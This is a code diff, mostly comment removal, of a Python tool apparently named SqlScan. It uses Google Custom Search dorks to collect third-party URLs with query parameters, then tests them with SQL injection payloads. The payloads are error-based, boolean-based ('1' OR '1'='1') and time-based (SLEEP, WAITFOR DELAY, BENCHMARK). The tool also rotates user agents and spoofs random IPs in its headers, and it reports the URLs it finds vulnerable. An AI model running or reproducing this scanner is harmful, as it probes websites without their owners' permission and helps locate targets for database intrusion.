@@ -13,10 +13,8 @@ from urllib3.util.ssl_ import create_urllib3_context
 from urllib3.util.retry import Retry
 import warnings
 
-# We keep Deprecation warnings quiet, but DO NOT suppress SSL security warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
-# ------------------------- Configuration -------------------------
 
 DEFAULT_SCANNED_URLS_FILE = 'scanned_urls.txt'
 DEFAULT_USER_AGENT_FILE = 'user_agents.txt'
@@ -25,11 +23,10 @@ DEFAULT_REPORT_FILE = 'report.csv'
 DEFAULT_LOG_FILE = 'scanner.log'
 
 MAX_VULNERABLE_URLS = 10
-REQUEST_TIMEOUT = (10, 20)            # (connect, read)
-DELAY_BETWEEN_REQUESTS = (1, 3)       # seconds (min, max)
-MAX_API_PAGES = 10                    # Google CSE: 10 pages * 10 results per page = 100
+REQUEST_TIMEOUT = (10, 20)
+DELAY_BETWEEN_REQUESTS = (1, 3)
+MAX_API_PAGES = 10
 
-# Enhanced SQL error patterns (case-insensitive checked on lowercased text)
 SQL_ERROR_PATTERNS = [
     r"sql syntax.*mysql",
     r"warning.*mysql_.*",
@@ -41,7 +38,6 @@ SQL_ERROR_PATTERNS = [
     r"db2 sql error"
 ]
 
-# ------------------------- Logging -------------------------
 
 logging.basicConfig(
     level=logging.WARNING,
@@ -49,23 +45,18 @@ logging.basicConfig(
     handlers=[logging.FileHandler(DEFAULT_LOG_FILE)]
 )
 logger = logging.getLogger(__name__)
-logger.propagate = False  # Prevent duplicate console logs
+logger.propagate = False
 
-# ------------------------- Hardened HTTPS Adapter -------------------------
 
 class CustomSSLAdapter(requests.adapters.HTTPAdapter):
-    """HTTPAdapter with hardened SSLContext (TLS 1.2+) and retries."""
 
     def __init__(self, *args, **kwargs):
         self.ssl_context = create_urllib3_context()
-        # Disable ancient protocols
         self.ssl_context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
-        # Enforce TLS 1.2+ (allow TLS 1.3 when available)
         self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
         if hasattr(ssl.TLSVersion, "TLSv1_3"):
             self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3
 
-        # Best-effort extra hardening
         try:
             self.ssl_context.options |= ssl.OP_NO_COMPRESSION
         except Exception:
@@ -88,7 +79,6 @@ class CustomSSLAdapter(requests.adapters.HTTPAdapter):
         kwargs["ssl_context"] = self.ssl_context
         return super().proxy_manager_for(*args, **kwargs)
 
-# ------------------------- Scanner -------------------------
 
 class SqlScan:
     def __init__(self, api_key: str, cse_id: str):
@@ -102,11 +92,9 @@ class SqlScan:
         self.verbose = False
         self.quiet_mode = False
 
-    # ----- Session / TLS -----
     def _configure_session(self) -> requests.Session:
         session = requests.Session()
 
-        # Retry compatibility for urllib3 v1/v2
         base_retry_kwargs = dict(
             total=3,
             backoff_factor=1,
@@ -115,16 +103,13 @@ class SqlScan:
         try:
             retry_strategy = Retry(allowed_methods={"HEAD", "GET", "OPTIONS"}, **base_retry_kwargs)
         except TypeError:
-            # For urllib3 v1
             retry_strategy = Retry(method_whitelist={"HEAD", "GET", "OPTIONS"}, **base_retry_kwargs)
 
         tls_adapter = CustomSSLAdapter(max_retries=retry_strategy)
-        # HTTPS gets TLS policy + retries; HTTP gets retries only
         session.mount("https://", tls_adapter)
         session.mount("http://", requests.adapters.HTTPAdapter(max_retries=retry_strategy))
         return session
 
-    # ----- Initialization -----
     def initialize_components(self):
         self.scanned_urls = self.load_scanned_urls(DEFAULT_SCANNED_URLS_FILE)
         self.user_agents = self.load_file(DEFAULT_USER_AGENT_FILE)
@@ -145,7 +130,6 @@ class SqlScan:
                 "' WAITFOR DELAY '0:0:5'--"
             ]
 
-    # ----- File I/O -----
     def load_file(self, file_path: str) -> List[str]:
         if not os.path.exists(file_path):
             logger.warning(f"File not found: {file_path}")
@@ -163,7 +147,6 @@ class SqlScan:
         with open(scanned_urls_file, 'a', encoding='utf-8') as f:
             f.write(url + '\n')
 
-    # ----- Headers / Utilities -----
     def get_random_headers(self) -> Dict[str, str]:
         return {
             'User-Agent': random.choice(self.user_agents),
@@ -179,7 +162,6 @@ class SqlScan:
     def _generate_random_ip(self) -> str:
         return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
-    # Helper to build URL adding or replacing a single query parameter
     def _with_param(self, url: str, param: str, value: str) -> str:
         parsed = urlparse(url)
         q = parse_qs(parsed.query, keep_blank_values=True)
@@ -187,12 +169,10 @@ class SqlScan:
         new_query = urlencode(q, doseq=True)
         return urlunparse(parsed._replace(query=new_query))
 
-    # ----- Google Dorking -----
     def dorking(self, dork: str, page: int) -> List[str]:
-        """Fetch one page (10 results) from Google Custom Search JSON API."""
         search_url = "https://www.googleapis.com/customsearch/v1"
         start = (page - 1) * 10 + 1
-        if start > 91:  # CSE allows start up to 91
+        if start > 91:
             return []
 
         params = {
@@ -214,7 +194,6 @@ class SqlScan:
             data = resp.json()
             items = data.get('items', [])
             urls = [item['link'] for item in items if 'link' in item]
-            # gentle pacing
             time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))
             return urls
         except requests.exceptions.HTTPError as e:
@@ -225,9 +204,7 @@ class SqlScan:
             logger.error(f"CSE parse error (page {page}): {e}")
         return []
 
-    # ----- URL Filtering -----
     def extract_valid_urls(self, urls: List[str]) -> List[str]:
-        """Filter URLs that haven't been scanned and contain likely SQLi parameters."""
         valid = []
         for url in urls:
             if url in self.scanned_urls:
@@ -262,9 +239,7 @@ class SqlScan:
         except Exception:
             return False
 
-    # ----- Vulnerability Checks -----
     def check_vulnerability(self, url: str) -> Optional[bool]:
-        """Return True (vulnerable), False (not), or None (skipped/error)."""
         try:
             if not self.test_connection(url):
                 logger.warning(f"Connection failed: {url}")
@@ -275,15 +250,12 @@ class SqlScan:
             if not query:
                 return None
 
-            # Choose a parameter to test first
             param = list(query.keys())[0]
 
-            # Check if parameter is dynamic (affects output)
             if not self._is_parameter_dynamic(url, param):
                 self.save_scanned_url(url)
                 return False
 
-            # Run deeper tests
             result = self._test_payloads(url, parsed, query)
             self.save_scanned_url(url)
             return result
@@ -292,7 +264,6 @@ class SqlScan:
             return None
 
     def _is_parameter_dynamic(self, url: str, param: str) -> bool:
-        """Compare baseline page with page where 'param' is altered."""
         try:
             original = self._make_request(url)
             if original is None:
@@ -308,7 +279,6 @@ class SqlScan:
             return False
 
     def _make_request(self, url: str) -> Optional[str]:
-        """Make an HTTP GET with secure defaults."""
         try:
             resp = self.session.get(
                 url,
@@ -322,7 +292,6 @@ class SqlScan:
             return None
 
     def _make_request_with_ssl_fallback(self, url: str) -> Optional[str]:
-        """Use a per-request secure SSL context (TLS 1.2+) if needed."""
         try:
             ctx = ssl.create_default_context()
             ctx.minimum_version = ssl.TLSVersion.TLSv1_2
@@ -340,7 +309,6 @@ class SqlScan:
             return None
 
     def _test_payloads(self, url: str, parsed, query) -> bool:
-        """Run error-based, boolean-based, and time-based checks."""
         for param, values in query.items():
             for value in values:
                 for payload in self.payloads:
@@ -349,20 +317,16 @@ class SqlScan:
 
                         response = self._make_request(test_url)
                         if response is None:
-                            # try secure fallback once
                             response = self._make_request_with_ssl_fallback(test_url)
                             if response is None:
                                 continue
 
-                        # Error-based detection
                         if self._detect_sql_errors(response):
                             return True
 
-                        # Boolean-based difference
                         if self._check_boolean_based(url, param):
                             return True
 
-                        # Time-based delay
                         if self._check_time_based(url, param):
                             return True
 
@@ -383,7 +347,6 @@ class SqlScan:
         return any(re.search(pattern, text) for pattern in SQL_ERROR_PATTERNS)
 
     def _check_boolean_based(self, url: str, param: str) -> bool:
-        """Inject TRUE/FALSE variants and compare responses."""
         true_payloads = [
             f"{param}=1' AND '1'='1",
             f"{param}=1' OR '1'='1",
@@ -416,23 +379,20 @@ class SqlScan:
         return False
 
     def _calculate_difference(self, base: str, true_resp: str, false_resp: str) -> bool:
-        # Quick heuristic on length difference
         if abs(len(true_resp) - len(false_resp)) > 100:
             return True
-        # Fallback to similarity ratio
         from difflib import SequenceMatcher
         true_ratio = SequenceMatcher(None, base, true_resp).ratio()
         false_ratio = SequenceMatcher(None, base, false_resp).ratio()
         return abs(true_ratio - false_ratio) > 0.3
 
     def _check_time_based(self, url: str, param: str) -> bool:
-        """Send time-delay payloads and measure response time."""
         payloads = [
             f"{param}=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
             f"{param}=1' WAITFOR DELAY '0:0:5'-- ",
             f"{param}=1 AND BENCHMARK(5000000,MD5(NOW()))"
         ]
-        threshold = 4  # seconds
+        threshold = 4
         for p in payloads:
             start = time.time()
             test_url = self._with_param(url, param, p.split("=", 1)[1])
@@ -442,7 +402,6 @@ class SqlScan:
                 return True
         return False
 
-    # ----- Orchestration -----
     def find_vulnerable_urls(self, dork: str, max_vulnerable: int) -> List[str]:
         vulnerable_urls: List[str] = []
         page = 1
@@ -485,7 +444,6 @@ class SqlScan:
         print(f"{'='*50}\n")
         return vulnerable_urls
 
-# ------------------------- CLI helpers -------------------------
 
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -535,7 +493,6 @@ def write_report(vulnerable_urls: List[str], filename: str = DEFAULT_REPORT_FILE
         writer.writerow(["Vulnerable URLs"])
         writer.writerows([[url] for url in vulnerable_urls])
 
-# ------------------------- Main -------------------------
 
 def main():
     try:
